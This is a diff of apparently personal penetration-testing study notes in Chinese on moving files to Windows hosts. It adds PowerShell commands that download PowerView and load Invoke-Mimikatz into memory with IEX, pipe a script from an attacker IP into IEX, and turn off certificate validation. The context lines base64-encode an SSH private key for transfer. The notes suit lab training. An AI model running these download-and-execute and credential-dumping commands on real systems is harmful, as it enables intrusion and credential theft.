@@ -18,8 +18,20 @@ cat id_rsa |base64 -w 0;echo                                       编码 id_rsa
 PS C:\htb> Get-FileHash C:\Users\Public\id_rsa -Algorithm md5      解码，核对 md5 哈希，但非常大的字符串，可能出错
 
 
+PowerShell 中，使用 System.Net.WebClient 类通过 HTTP、HTTPS 或 FTP 下载文件
+  https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-5.0
 
+PS C:\htb> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
+PS C:\htb> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
+PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')  下在内存运行
+或
+PS C:\htb> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX 下在内存运行
 
+PS C:\htb>Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
+可以使用别名 iwr、curl 和 wget 代替 Invoke-WebRequest
+
+PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX                  用 -UseBasicParsing 绕过 IE 配置错误
+PS C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}      绕过证书不被信任
 
 
 Windows download:
